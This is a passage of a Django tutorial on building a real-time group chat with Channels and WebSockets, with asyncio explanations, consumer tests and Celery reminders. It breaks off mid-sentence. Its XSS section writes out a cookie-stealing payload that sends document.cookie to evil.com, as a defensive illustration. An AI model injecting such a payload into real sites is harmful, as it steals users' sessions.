docs.title: Why HTTP doesn't work for chat
docs.text:
HTTP is a "request → response → connection closed" protocol. The server cannot send a message to the browser without a request from the browser.

HTTP (classic):
  Browser ── GET /chat/ ──► Django view → HttpResponse → [connection closed]
  Browser ── GET /chat/ ──► Django view → HttpResponse → [connection closed]
  Browser ── GET /chat/ ──► Django view → HttpResponse → [connection closed]
  (a new connection each time — the server is silent between requests)

docs.title: Two workaround options for chat
docs.text: Approach How it works Problem Polling The browser requests /new-messages/ every 2 seconds 1000 users = 500 req/s. A message arrives with a delay of up to 2 sec Long polling The browser sends a request, the server keeps it open until a new message arrives 1000 users = 1000 blocked threads Server-Sent Events A one-way stream from the server to the browser Not two-way (the browser cannot send)

docs.title: Sync Django + Long polling = a scaling problem
docs.text:
Sync Django thread pool:
  Typically: 4–16 worker threads (gunicorn/wsgi)

  1000 users in the chat → 1000 threads blocked waiting for a message
  Thread pool exhausted → the rest of the site (forms, notes, login) doesn't respond
  Each blocked thread: ~8 MB RAM for the stack → 1000 users = ~8 GB RAM just for threads

That is exactly why chat needs a fundamentally different approach: a persistent connection + async.

docs.title: WebSocket — a persistent two-way connection
docs.text: A WebSocket is established through an HTTP Upgrade handshake once, after which the open TCP connection lives until the tab is closed.

docs.title: Handshake
docs.text:
1. Browser: GET /ws/groups/7/chat/ HTTP/1.1
            Upgrade: websocket
            Connection: Upgrade
            Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==

2. Server:  HTTP/1.1 101 Switching Protocols
            Upgrade: websocket
            Connection: Upgrade
            Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=

3. After this — not HTTP but WebSocket frames (a binary protocol over TCP)

docs.title: Flow after the connection is established
docs.text:
WebSocket (after handshake):
  Browser ════════════ PERSISTENT TCP ════════════ Server
  ↑ Either side can send data at any moment

  Viktor: ws.send({content: "Hi!"}) ────────────► consumer.receive()
                                                          │
                                                     group_send()
                                                          │
          ws.onmessage ◄── consumer.send() ◄─────────────┤ Olya
          ws.onmessage ◄── consumer.send() ◄─────────────┤ Masha
          ws.onmessage ◄── consumer.send() ◄─────────────┘ Viktor

docs.title: The browser WebSocket API
docs.text:
// Built into the browser — no libraries needed
const ws = new WebSocket('ws://localhost/ws/groups/7/chat/')

ws.onopen = () => {
    console.log('Connected to the chat')
}

ws.onmessage = (event) => {
    const data = JSON.parse(event.data)
    console.log('New message:', data)
}

ws.onclose = (event) => {
    // event.code:
    //   1000 — normal closure
    //   1006 — abnormal (the internet dropped)
    //   4003 — custom code (ours: not a member)
    console.log(`Connection closed: ${event.code}`)
}

ws.onerror = (error) => {
    console.error('WS error:', error)
}

ws.send(JSON.stringify({ content: 'Hi!' }))
ws.close()

docs.title: asyncio — event loop and coroutines
docs.text: To understand Django Channels, you need to understand asyncio — Python's standard library for asynchronous programming.

docs.title: Event loop — the heart of async Python
docs.text:
import asyncio

# Event loop — a "scheduler" of coroutines
# NOT parallel execution (not threading)
# Cooperative multitasking: tasks voluntarily yield via await

asyncio.run(main())

Event loop — one thread, many coroutines:

  ┌──────────────────────────────────────────────────────────┐
  │  Task 1: fetch(url_a) ──── await ──→ PAUSE               │
  │  Task 2: fetch(url_b) ──── await ──→ PAUSE               │
  │  Task 3: fetch(url_c) ──── await ──→ PAUSE               │
  │                                                           │
  │  I/O ready for Task 1 → RESUME Task 1                    │
  │  I/O ready for Task 3 → RESUME Task 3                    │
  │  I/O ready for Task 2 → RESUME Task 2                    │
  └──────────────────────────────────────────────────────────┘

  ≠ Threading (parallel execution in several OS threads)
  = Cooperative multitasking (one thread, switching via await)

docs.title: Coroutine vs a regular function
docs.text:
# A regular function — runs to the end without stopping
def sync_fetch(url):
    response = requests.get(url)   # blocks the thread for the whole request
    return response.text

# A coroutine — can pause and yield to the event loop
async def async_fetch(url):
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            return await response.text()  # here it yields to the event loop

docs.title: await — where the switching happens
docs.text:
async def handler():
    # await = "start an async operation and yield to the event loop"
    result = await some_async_operation()

    # CPU code — the event loop does NOT switch here
    processed = process(result)

    return processed

docs.title: asyncio.gather — concurrent operations
docs.text:
async def fetch_all():
    # Runs three tasks "at the same time" (concurrent, not parallel)
    results = await asyncio.gather(
        fetch(url_1),
        fetch(url_2),
        fetch(url_3),
    )
    # If each fetch takes 1 sec → ~1 sec in total (not 3)
    return results

docs.title: Sync vs Async — where the difference is real
Comparing the models
docs.text: Sync (WSGI/Gunicorn) Async (ASGI/Uvicorn) Model Thread per request Event loop + coroutines 1000 connections 1000 OS threads (~8 GB RAM) 1000 coroutines (~a few MB) CPU while there are no messages The thread is blocked and "sleeps" The event loop serves others Code complexity Simpler (sync Python) More complex (async/await everywhere) Risks Thread exhaustion Blocking calls in an async context

docs.title: Async is not always better
docs.text:
Sync Django: CRUD for notes, forms, authorization
  → sync fits perfectly
  → switching to async: complicates the code, gives nothing

Async Django Channels: 1000 concurrent WS connections in the chat
  → sync is impossible (thread exhaustion)
  → async is the only correct approach

Rule: async is justified for long-lived connections and high-concurrency I/O. For ordinary CRUD it is unnecessary complexity.

docs.title: What is async and what is sync in notes_chat_app
docs.text: Functionality Implementation Why Notes, Notebooks, Tags Sync views Simple CRUD, short requests TodoList, ShoppingList Sync views Simple mutations Authorization (login/register) Sync views Standard Django auth Group chat AsyncWebsocketConsumer WS = thousands of long-lived connections

docs.title: ASGI stack architecture
docs.text:
Browser (HTTP)          Browser (WebSocket)
      │                        │
      ▼                        ▼
   nginx :80  (reverse proxy — passes it on)
      │                        │
      ▼                        ▼
   Uvicorn ASGI :8001  (one process — both protocols)
      │
      ▼
   ProtocolTypeRouter  (notes_project/asgi.py)
      │
      ├── protocol == "http"
      │       ▼
      │   Django HTTP app (views.py, urls.py, templates)
      │
      └── protocol == "websocket"
              ▼
          AuthMiddlewareStack
              ▼
          WebSocket URLRouter  (notes_project/routing.py)
              ▼
          GroupChatConsumer  (notes_app/consumers.py)
              │
              ├──► PostgreSQL (via database_sync_to_async)
              └──► InMemoryChannelLayer / RedisChannelLayer (pub/sub)
Component Role HTTP Django equivalent ProtocolTypeRouter Distinguishes HTTP and WS by protocol type ROOT_URLCONF AuthMiddlewareStack Reads the session cookie → scope['user'] @login_required decorator WebSocket URLRouter Routes the WS URL to a Consumer urls.py GroupChatConsumer Handles the WS connection the whole time view (but lives longer) InMemoryChannelLayer Pub/sub broadcast between consumers (no direct equivalent)

docs.title: asgi.py — the entry point
docs.text:
# notes_project/asgi.py
import os
from django.core.asgi import get_asgi_application
from channels.routing import ProtocolTypeRouter, URLRouter
from channels.auth import AuthMiddlewareStack

os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'notes_project.settings')

# CRITICAL: get_asgi_application() BEFORE any import from notes_app
# The Django app registry (AppConfig.ready()) must be initialized
# BEFORE importing models or consumers.
# If you swap the order → AppRegistryNotReady exception.
django_asgi_app = get_asgi_application()

# Only after get_asgi_application() is it safe to import from notes_app
from notes_project.routing import websocket_urlpatterns

application = ProtocolTypeRouter({
    # HTTP → regular Django (views.py, templates, static)
    "http": django_asgi_app,

    # WebSocket → Auth middleware → URL router → Consumer
    "websocket": AuthMiddlewareStack(
        URLRouter(websocket_urlpatterns)
    ),
})

docs.title: What AuthMiddlewareStack does
docs.text:
WebSocket handshake request:
  GET /ws/groups/7/chat/
  Cookie: sessionid=abc123xyz

AuthMiddlewareStack:
  1. Reads the sessionid cookie from the handshake headers
  2. Finds the session in the Django session backend (DB)
  3. Loads the User from the session
  4. Puts it into scope['user']

Consumer:
  self.user = self.scope['user']
  # → a User object (or AnonymousUser if not logged in)

docs.title: re_path vs path for WebSocket
docs.text:
# path() — simpler:
from django.urls import path
websocket_urlpatterns = [
    path('ws/groups/<int:group_pk>/chat/', consumers.GroupChatConsumer.as_asgi()),
]

# re_path() — regex, more control:
from django.urls import re_path
websocket_urlpatterns = [
    re_path(r'^ws/groups/(?P<group_pk>\d+)/chat/$', consumers.GroupChatConsumer.as_asgi()),
]

# Both options work.
# re_path is the traditional choice for WebSocket (more examples in the documentation)

docs.title: settings.py — Channel Layers and Daphne
docs.text:
# notes_project/settings.py

INSTALLED_APPS = [
    'daphne',        # ← FIRST in the list! Must come before 'django.contrib.*'
    'channels',      # Django Channels
    'django.contrib.admin',
    # ... the rest of the apps
    'notes_app',
]

# ASGI application (instead of WSGI_APPLICATION for Channels)
ASGI_APPLICATION = 'notes_project.asgi.application'

# Channel Layer — chosen depending on the environment
_REDIS_URL = os.environ.get('REDIS_URL')

if _REDIS_URL:
    # Docker / Production: RedisChannelLayer
    CHANNEL_LAYERS = {
        "default": {
            "BACKEND": "channels_redis.core.RedisChannelLayer",
            "CONFIG": {
                "hosts": [{
                    "address": _REDIS_URL,
                    # socket_timeout=None — CRITICAL for idle WS connections
                    # Without it channels_redis sets socket_timeout=5
                    # and brpop_timeout=5 conflict → TimeoutError after idling
                    "socket_timeout": None,
                    "socket_connect_timeout": 5,
                    # Checks Redis every 30 sec — prevents a silent disconnect
                    "health_check_interval": 30,
                }],
            },
        }
    }
else:
    # Local dev (without Redis): InMemoryChannelLayer
    CHANNEL_LAYERS = {
        "default": {
            "BACKEND": "channels.layers.InMemoryChannelLayer",
        }
    }

docs.title: Why daphne comes first in INSTALLED_APPS
docs.text:
# Without 'daphne' first:
$ python manage.py runserver
# → Django starts the built-in WSGI server
# → WebSocket doesn't work (WSGI doesn't support WS)

# With 'daphne' first:
$ python manage.py runserver
# → Daphne overrides runserver → starts an ASGI server
# → WebSocket works

# In production (Docker) we use uvicorn directly:
# exec python -m uvicorn notes_project.asgi:application --host 0.0.0.0 --port 8001
# → daphne first in INSTALLED_APPS is needed only for the local runserver

docs.title: Consumer — lifecycle and methods
docs.text: A consumer is the equivalent of a view, but: - It lives for the whole connection (not a single request) - It runs as an async coroutine - It handles events: connect, receive, disconnect, channel layer events

docs.title: ASCII lifecycle diagram
docs.text:
The browser opens the chat tab:
  ┌─────────────────────────────────────────────────┐
  │ 1. connect()                                     │
  │    ├── checks authorization (is_authenticated)  │
  │    ├── checks membership                         │
  │    ├── group_add() → subscribes to the channel   │
  │    ├── accept() → confirms the WS connection     │
  │    └── send() history × N messages               │
  │                                                   │
  │ 2. receive() ← the browser sent a message        │
  │    ├── validates content                          │
  │    ├── save_message() → PostgreSQL               │
  │    └── group_send() → broadcast to everyone      │
  │                 │                                 │
  │ 3. chat_message() ← the channel layer delivered  │
  │    └── send() → sends to the browser             │
  │                                                   │
  │    (2 and 3 repeat N times)                      │
  │                                                   │
  │ 4. disconnect()                                   │
  │    └── group_discard() → unsubscribes            │
  └─────────────────────────────────────────────────┘

docs.title: The difference between receive() and chat_message()
docs.text:
receive()      — the browser of THIS connection sent a message
chat_message() — the channel layer delivered a broadcast from any participant

When Olya sends "Hi":
  Olya's consumer:   receive() → group_send("chat_group_7", {...})
  Olya's consumer:   chat_message() ← channel layer → send() → Olya's browser
  Masha's consumer:  chat_message() ← channel layer → send() → Masha's browser
  Viktor's consumer: chat_message() ← channel layer → send() → Viktor's browser

docs.title: database_sync_to_async — ORM in an async context
docs.text: The Django ORM is synchronous. Running sync code directly in an async context blocks the event loop and raises SynchronousOnlyOperation.

docs.title: How it works
docs.text:
# ❌ WRONG — SynchronousOnlyOperation:
async def connect(self):
    group = Group.objects.get(pk=self.group_pk)
    # ↑ sync ORM in an async context → blocks the event loop → exception

# ✅ RIGHT — @database_sync_to_async:
@database_sync_to_async
def check_membership(self, group_pk, user):
    # A regular sync def
    # @database_sync_to_async runs it in the Django thread pool
    # The event loop is free while the thread executes the SQL
    try:
        group = Group.objects.get(pk=group_pk)
        return group.user_set.filter(pk=user.pk).exists()
    except Group.DoesNotExist:
        return False

async def connect(self):
    is_member = await self.check_membership(self.group_pk, self.user)
    # await = "run it in the thread pool and wait for the result without blocking the event loop"

docs.title: How it works under the hood
docs.text:
Event loop (one thread):
  coroutine connect() is running...

  → encounters: await self.check_membership(...)
  → @database_sync_to_async: Submit to the thread pool executor
  → Event loop: keeps serving OTHER connections

Thread pool (a separate thread):
  → runs the sync Django ORM query (SELECT ... FROM ...)
  → returns the result

Event loop:
  → receives the result from the thread pool
  → resumes the coroutine connect() from the next line

docs.title: Critical: return a list, not a QuerySet
docs.text:
# ❌ WRONG — the QuerySet is lazy, it gets iterated in the async context:
@database_sync_to_async
def load_history(self, group_pk):
    return ChatMessage.objects.filter(group_id=group_pk).values(...)
    # The QuerySet hasn't executed the SQL! The SQL runs on iteration.
    # Iteration will happen in the async context → SynchronousOnlyOperation

# ✅ RIGHT — list() forces the SQL in the worker thread:
@database_sync_to_async
def load_history(self, group_pk):
    qs = (
        ChatMessage.objects
        .filter(group_id=group_pk)
        .select_related('author')
        .order_by('-timestamp')[:50]
    )
    messages = list(qs.values('id', 'author__username', 'content', 'timestamp'))
    # list() executes the SQL HERE, in the worker thread
    messages.reverse()  # chronological order
    return messages      # a Python list — safe to return

docs.title: database_sync_to_async as an inline wrapper
docs.text:
# Option 1: decorator (most common)
@database_sync_to_async
def save_message(self, group_pk, user, content):
    return ChatMessage.objects.create(group_id=group_pk, author=user, content=content)

# Option 2: inline wrapper (for one-off operations)
async def receive(self, text_data):
    msg = await database_sync_to_async(ChatMessage.objects.create)(
        group_id=self.group_pk,
        author=self.user,
        content=content,
    )

docs.title: Async ORM methods in Django 4.1+
docs.text:
Django 4.1 added native async ORM methods. In async views they are more convenient than database_sync_to_async.

Sync method Async equivalent What it does qs.filter(...).first() await qs.filter(...).afirst() The first result or None qs.get(pk=x) await qs.aget(pk=x) One object or DoesNotExist qs.count() await qs.acount() Number of rows Model.objects.create(...) await Model.objects.acreate(...) Creating a record qs.update(...) await qs.aupdate(...) Bulk update qs.delete() await qs.adelete() Bulk delete obj.save() await obj.asave() Saving an object obj.delete() await obj.adelete() Deleting an object for obj in qs: async for obj in qs: Iterating over a QuerySet qs.exists() await qs.aexists() Whether there is at least one 
# Async view — native async methods:
async def note_list(request):
    notes = [n async for n in Note.objects.filter(user=request.user).select_related('notebook')]
    return render(request, 'notes/list.html', {'notes': notes})

async def note_detail(request, pk):
    try:
        note = await Note.objects.aget(pk=pk, user=request.user)
    except Note.DoesNotExist:
        raise Http404
    return render(request, 'notes/detail.html', {'note': note})

In a Consumer, use @database_sync_to_async — it lets you run several ORM operations in a single thread pool call and gives better control over transactions.

docs.title: Channel layer — how it delivers to everyone
The pub/sub concept
docs.text:
The channel layer is a message bus for Django Channels.
Each Consumer subscribes to a "group" (a named channel).
group_send() → delivers to ALL subscribers of the group.

State of the channel layer for the chat of group 7:
  Group "chat_group_7":
    ├── Viktor's consumer (channel_name: "specific.abc123")
    ├── Olya's consumer   (channel_name: "specific.def456")
    └── Masha's consumer  (channel_name: "specific.ghi789")

docs.title: group_send flow
docs.text:
Viktor sends "Hi":

1. Viktor's consumer: receive("Hi")
2. Viktor's consumer: group_send("chat_group_7", {
       'type': 'chat_message',
       'author': 'Viktor',
       'content': 'Hi',
       'timestamp': '2025-01-01T12:00:00',
   })

3. The channel layer finds the group "chat_group_7"
   → Viktor's consumer: chat_message(event) → send() → Viktor's browser
   → Olya's consumer:   chat_message(event) → send() → Olya's browser
   → Masha's consumer:  chat_message(event) → send() → Masha's browser

Result: "Hi" appears in all three browsers at the same time.

docs.title: type → method mapping
docs.text:
# 'type' in group_send → the name of the method in the Consumer
# Dot → underscore:

group_send(room, {'type': 'chat_message', ...})  → Consumer.chat_message(event)
group_send(room, {'type': 'chat.message', ...})  → Consumer.chat_message(event)
group_send(room, {'type': 'user.joined', ...})   → Consumer.user_joined(event)
group_send(room, {'type': 'typing.indicator', ...}) → Consumer.typing_indicator(event)

docs.title: Why socket_timeout=None
docs.text:
Problem:
  channels_redis by default: socket_timeout=5 (5 seconds)
  channels_redis uses Redis BRPOP with timeout=5

  With an idle WebSocket (nobody writes for > 5 sec):
    BRPOP timeout → channels_redis raises TimeoutError
    → the Consumer gets an exception → the WS connection closes
    → The user sees: "Connection lost"

Solution:
  socket_timeout=None → aioredis has no socket timeout
  BRPOP can wait indefinitely
  health_check_interval=30 keeps the connection alive (ping every 30 sec)
  nginx proxy_read_timeout=300s → nginx won't close the WS before 5 minutes

docs.text:
# notes_app/consumers.py
import json
from channels.generic.websocket import AsyncWebsocketConsumer
from channels.db import database_sync_to_async
from django.contrib.auth.models import Group


class GroupChatConsumer(AsyncWebsocketConsumer):
    """
    WebSocket consumer for the group chat.

    URL: /ws/groups/<group_pk>/chat/

    Client → Server:
        {"content": "Message text"}

    Server → Client (history):
        {"type": "history", "author": "...", "content": "...", "timestamp": "..."}

    Server → Client (live):
        {"type": "message", "author": "...", "content": "...", "timestamp": "..."}
    """

    async def connect(self):
        self.user = self.scope['user']

        # 1. Authorization
        if not self.user.is_authenticated:
            await self.close(code=4001)
            return

        # 2. group_pk from the URL kwargs
        self.group_pk = int(self.scope['url_route']['kwargs']['group_pk'])

        # 3. Membership check (ORM in a worker thread)
        is_member = await self.check_membership(self.group_pk, self.user)
        if not is_member:
            await self.close(code=4003)
            return

        # 4. Channel group name
        self.room_group_name = f"chat_group_{self.group_pk}"

        # 5. Subscribe to the channel group
        await self.channel_layer.group_add(
            self.room_group_name,
            self.channel_name,
        )

        # 6. Accept the connection
        await self.accept()

        # 7. Send the history
        history = await self.load_history(self.group_pk)
        for msg in history:
            await self.send(text_data=json.dumps({
                'type': 'history',
                'author': msg['author__username'],
                'content': msg['content'],
                'timestamp': msg['timestamp'].isoformat(),
            }))

    async def receive(self, text_data):
        try:
            data = json.loads(text_data)
        except json.JSONDecodeError:
            return

        content = data.get('content', '').strip()

        if not content:
            return
        if len(content) > 2000:
            await self.send(text_data=json.dumps({
                'type': 'error',
                'message': 'Повідомлення занадто довге (максимум 2000 символів)',
            }))
            return

        msg = await self.save_message(self.group_pk, self.user, content)

        await self.channel_layer.group_send(
            self.room_group_name,
            {
                'type': 'chat_message',
                'author': self.user.username,
                'content': content,
                'timestamp': msg.timestamp.isoformat(),
            }
        )

    async def chat_message(self, event):
        await self.send(text_data=json.dumps({
            'type': 'message',
            'author': event['author'],
            'content': event['content'],
            'timestamp': event['timestamp'],
        }))

    async def disconnect(self, close_code):
        # hasattr check: in case connect() finished before group_add
        if hasattr(self, 'room_group_name'):
            await self.channel_layer.group_discard(
                self.room_group_name,
                self.channel_name,
            )

    # ─── ORM helpers ─────────────────────────────────────────────────

    @database_sync_to_async
    def check_membership(self, group_pk, user):
        try:
            group = Group.objects.get(pk=group_pk)
            return group.user_set.filter(pk=user.pk).exists()
        except Group.DoesNotExist:
            return False

    @database_sync_to_async
    def load_history(self, group_pk):
        from notes_app.models import ChatMessage
        qs = (
            ChatMessage.objects
            .filter(group_id=group_pk)
            .select_related('author')
            .order_by('-timestamp')[:50]
        )
        messages = list(qs.values('id', 'author__username', 'content', 'timestamp'))
        messages.reverse()
        return messages

    @database_sync_to_async
    def save_message(self, group_pk, user, content):
        from notes_app.models import ChatMessage
        return ChatMessage.objects.create(
            group_id=group_pk,
            author=user,
            content=content,
        )

// notes_app/static/notes_app/js/group_chat.js

document.addEventListener('DOMContentLoaded', function () {
    const container = document.getElementById('chat-container');
    const groupPk = container.dataset.groupPk;
    const messagesDiv = document.getElementById('chat-messages');
    const messageInput = document.getElementById('message-input');
    const sendButton = document.getElementById('send-button');

    // ws:// for HTTP, wss:// for HTTPS (ngrok)
    const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const wsUrl = `${wsProtocol}//${window.location.host}/ws/groups/${groupPk}/chat/`;

    let ws = null;
    let reconnectAttempts = 0;
    const MAX_RECONNECT = 5;

    function connect() {
        ws = new WebSocket(wsUrl);

        ws.onopen = function () {
            reconnectAttempts = 0;
            sendButton.disabled = false;
            updateStatus('connected', 'Підключено');
        };

        ws.onmessage = function (event) {
            const data = JSON.parse(event.data);
            if (data.type === 'history' || data.type === 'message') {
                addMessage(data);
            } else if (data.type === 'error') {
                showError(data.message);
            }
        };

        ws.onclose = function (event) {
            sendButton.disabled = true;

            // Custom close codes — don't reconnect
            if (event.code === 4001 || event.code === 4003) {
                updateStatus('error', 'Доступ заборонено');
                return;
            }

            if (reconnectAttempts < MAX_RECONNECT) {
                reconnectAttempts++;
                const delay = Math.min(1000 * reconnectAttempts, 5000);
                updateStatus('reconnecting', `Перепідключення (${reconnectAttempts}/${MAX_RECONNECT})...`);
                setTimeout(connect, delay);
            } else {
                updateStatus('error', 'Помилка підключення. Перезавантажте сторінку.');
            }
        };
    }

    function sendMessage() {
        const content = messageInput.value.trim();
        if (!content || !ws || ws.readyState !== WebSocket.OPEN) return;
        ws.send(JSON.stringify({ content: content }));
        messageInput.value = '';
        messageInput.focus();
    }

    sendButton.addEventListener('click', sendMessage);

    messageInput.addEventListener('keydown', function (e) {
        if (e.key === 'Enter' && !e.shiftKey) {
            e.preventDefault();
            sendMessage();
        }
    });

    function addMessage(data) {
        const wrapper = document.createElement('div');
        wrapper.className = 'chat-message';
        // escapeHtml() — REQUIRED for XSS protection
        wrapper.innerHTML = `
            <span class="chat-author">${escapeHtml(data.author)}</span>
            <span class="chat-time">${formatTime(data.timestamp)}</span>
            <div class="chat-content">${escapeHtml(data.content)}</div>
        `;
        messagesDiv.appendChild(wrapper);
        messagesDiv.scrollTop = messagesDiv.scrollHeight;
    }

    function escapeHtml(text) {
        const div = document.createElement('div');
        div.appendChild(document.createTextNode(text));
        return div.innerHTML;
    }

    function formatTime(isoString) {
        return new Date(isoString).toLocaleTimeString('uk-UA', {
            hour: '2-digit', minute: '2-digit',
        });
    }

    function updateStatus(type, message) {
        const el = document.getElementById('connection-status');
        if (el) { el.textContent = message; el.className = `status-${type}`; }
    }

    function showError(message) {
        const el = document.createElement('div');
        el.className = 'alert alert-warning';
        el.textContent = message;
        messagesDiv.appendChild(el);
        setTimeout(() => el.remove(), 5000);
    }

    connect();
});

docs.title: XSS protection
docs.text: The chat shows content from other users — a classic XSS attack point.

docs.title: The attack vector
docs.text:
The attacker sends into the chat:
  <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">

If the JS client inserts it via innerHTML without escaping:
  div.innerHTML = data.content  ← DANGEROUS

→ The browser parses the HTML → the img fails to load → onerror fires
→ fetch() sends the cookies to evil.com → sessions are stolen

docs.title: Three safe options
docs.text:
// ✅ Method 1: textContent (text only, HTML is not parsed)
messageDiv.textContent = data.content

// ✅ Method 2: createTextNode
messageDiv.appendChild(document.createTextNode(data.content))

// ✅ Method 3: escapeHtml() before innerHTML (if you need HTML markup)
function escapeHtml(text) {
    const div = document.createElement('div')
    div.appendChild(document.createTextNode(text))
    return div.innerHTML
    // & → &  < → <  > → >  " → "
}
wrapper.innerHTML = `<strong>${escapeHtml(data.author)}</strong>: ${escapeHtml(data.content)}`

In notes_chat_app we use method 3 (escapeHtml) — we need HTML markup for the message (author, time, content in separate elements).

docs.title: Basic test structure
docs.text:
# notes_app/tests/test_consumers.py
import json
from channels.testing import WebsocketCommunicator
from channels.db import database_sync_to_async
from django.contrib.auth.models import User, Group
from django.test import TransactionTestCase, override_settings

from notes_project.asgi import application

TEST_CHANNEL_LAYERS = {
    "default": {
        "BACKEND": "channels.layers.InMemoryChannelLayer",
    }
}


def _make_session_cookie(user):
    """Helper: creates a session cookie for the user."""
    from importlib import import_module
    from django.conf import settings

    engine = import_module(settings.SESSION_ENGINE)
    session = engine.SessionStore()
    if user:
        session[settings.AUTH_USER_SESSION_KEY] = user.pk
        session['_auth_user_backend'] = 'django.contrib.auth.backends.ModelBackend'
        session['_auth_user_hash'] = user.get_session_auth_hash()
    session.save()
    return session.session_key


@override_settings(CHANNEL_LAYERS=TEST_CHANNEL_LAYERS)
class GroupChatConsumerTest(TransactionTestCase):
    # TransactionTestCase, not TestCase:
    # WebsocketCommunicator opens a separate thread for the consumer.
    # TestCase wraps each test in a transaction — the consumer from another thread
    # doesn't see this uncommitted data → the setUp objects "disappear".
    # TransactionTestCase doesn't wrap in a transaction → the data is visible to all threads.

    def setUp(self):
        # setUp() is synchronous, even if the tests are async.
        # We make ORM calls directly: setUp() never runs
        # in an async context, so database_sync_to_async isn't needed.
        self.user = User.objects.create_user('testuser', password='testpass123')
        self.other_user = User.objects.create_user('otheruser', password='testpass123')
        self.group = Group.objects.create(name='Test Group')
        self.group.user_set.add(self.user)

    def _communicator(self, user=None, group_pk=None):
        session_key = _make_session_cookie(user)
        pk = group_pk if group_pk is not None else self.group.pk
        return WebsocketCommunicator(
            application,
            f"/ws/groups/{pk}/chat/",
            headers=[(b"cookie", f"sessionid={session_key}".encode())],
        )

asyncSetUp() in Django 5.1+

Django 5.1 added asyncSetUp() and asyncTearDown() to TransactionTestCase. In Django 5.2+ you can write: 

async def asyncSetUp(self):
    self.user = await User.objects.acreate_user('testuser', password='pass')
    self.group = await DjangoGroup.objects.acreate(name='Chat')
    await self.group.user_set.aadd(self.user)
Both approaches are correct. notes_chat_app uses a synchronous setUp() — it is simpler and doesn't require database_sync_to_async in the initialization method.

docs.title: The problem: Django and request time
docs.text:
Django is built on the Request → Response model. Every HTTP request should get a response as fast as possible — ideally in < 200 ms.

What happens if reminders are implemented right inside a view?

# ❌ DON'T DO THIS
def note_detail(request, pk):
    note = get_object_or_404(Note, pk=pk, user=request.user)

    # Check all reminders for all users...
    for reminder in Reminder.objects.filter(remind_at__lte=now()):
        send_mail(...)   # 0.5 seconds per email
        reminder.is_sent = True
        reminder.save()

    return render(request, 'notes_app/note_detail.html', {'note': note})

Problems:

Problem Consequence send_mail() blocks the thread the page takes 5+ seconds to load Runs only on an HTTP request the reminder doesn't fire if nobody opened the page The reminder must be sent exactly at the given time impossible without a background scheduler

Rule: a Django view must not perform operations that depend on time or may take longer than 1 second.

docs.title: What Celery is
docs.text:
Celery is a distributed task queue. It lets Django hand work off to a separate worker process and return a response to the browser immediately.

Django (view)
    │ .delay()  or  .apply_async()
    ▼
Redis (broker) ← a message in the queue
    │
    ▼
Celery Worker ← a separate process, runs the task
    │
    ▼
PostgreSQL / Email / any side effect

Components:

Component Role Task A Python function marked with @shared_task Broker the message queue (Redis DB 1 in our project) Worker a separate process that reads tasks from the broker and runs them Beat the scheduler: launches tasks on a schedule (cron-like) Result Backend storage for task results (Redis DB 1)

Why not WebSocket for reminders?

WebSocket requires an active browser connection. A reminder must send an email regardless of whether the browser is open. The Celery Worker is always active.

docs.title: Reminder system architecture
docs.text:
Celery Beat (every minute)
        │
        ▼
@shared_task send_reminder_notifications()
        │
        ├─ Reminder.objects.filter(remind_at__lte=now, is_sent=False)
        │
        └─ for reminder:
               ├── send_mail()          ← email (in dev: console backend)
               ├── reminder.is_sent = True
               └── _schedule_next()    ← if repeat_pattern ≠ none

Browser (every 60 seconds, HTTP polling)
        │
        ▼
GET /reminders/check/  →  JSON [{id, note__title, message, remind_at}]
        │
        ▼
reminders.js  →  Bootstrap Toast (a pop-up message)

Two independent mechanisms: - Email — Celery does this in the background, independently of the browser. - Browser Toast — JS asks the server every minute and shows a pop-up UI.

docs.title: Step 1 — celery.py: initializing the app
docs.text:
The file notes_project/celery.py initializes the Celery app:

# notes_project/celery.py
import os
from celery import Celery

os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'notes_project.settings')

app = Celery('notes_project')
app.config_from_object('django.conf:settings', namespace='CELERY')
app.autodiscover_tasks()

namespace='CELERY' means that Celery reads only those settings from settings.py that start with CELERY_. For example, CELERY_BROKER_URL.

autodiscover_tasks() automatically finds the tasks.py files in every installed Django app.

Then in notes_project/__init__.py we register the Celery app when Django starts:

# notes_project/__init__.py
from .celery import app as celery_app

__all__ = ('celery_app',)

This ensures that the Celery app is loaded before any code starts using @shared_task.

docs.title: Step 2 — tasks.py: @shared_task
docs.text:
# notes_app/tasks.py
from celery import shared_task
from django.core.mail import send_mail
from django.conf import settings
from django.utils import timezone


@shared_task
def send_reminder_notifications():
    from .models import Reminder

    now = timezone.now()
    pending = (
        Reminder.objects
        .select_related('note__user')
        .filter(remind_at__lte=now, is_sent=False)
    )

    for reminder in pending:
        user = reminder.note.user

        if user.email:
            send_mail(
                subject=f'Нагадування: {reminder.note.title}',
                message=reminder.message or f'Час нагадування для «{reminder.note.title}».',
                from_email=settings.DEFAULT_FROM_EMAIL,
                recipient_list=[user.email],
                fail_silently=True,
            )

        reminder.is_sent = True
        reminder.save(update_fields=['is_sent'])

        _schedule_next(reminder)


def _schedule_next(reminder):
    if reminder.repeat_pattern == 'none':
        return

    from .models import Reminder
    from dateutil.relativedelta import relativedelta

    delta_map = {
        'daily':   relativedelta(days=1),
        'weekly':  relativedelta(weeks=1),
        'monthly': relativedelta(months=1),
    }
    delta = delta_map.get(reminder.repeat_pattern)
    if delta:
        Reminder.objects.create(
            note=reminder.note,
            remind_at=reminder.remind_at + delta,
            message=reminder.message,
            is_sent=False,
            repeat_pattern=reminder.repeat_pattern,
        )

Important details:

@shared_task instead of @app.task — doesn't require a direct import of the Celery app. The task is "bound" to the active app at execution time. This is the standard for Django projects.

select_related('note__user') — one SQL query instead of N+1. Thanks to this, 100 reminders take 1 query, not 201.

save(update_fields=['is_sent']) — updates only one field, not the whole record. More efficient and safer (avoids overwriting changes from other processes).

relativedelta instead of timedelta for months — timedelta(days=30) gives an inaccurate result for February. relativedelta(months=1) correctly handles the length of the month:

# ❌ timedelta is inaccurate for months
datetime(2024, 1, 31) + timedelta(days=30)  # → 2024-03-01 (February skipped!)

# ✅ relativedelta keeps the month logic
datetime(2024, 1, 31) + relativedelta(months=1)  # → 2024-02-29 (correct)

Deferred model imports (from .models import Reminder inside the function) prevent circular imports during Django initialization.

docs.title: Step 3 — settings.py: CELERY_* configuration
docs.text:
# notes_project/settings.py (end of file)

# Celery uses Redis DB 1 so it doesn't conflict with
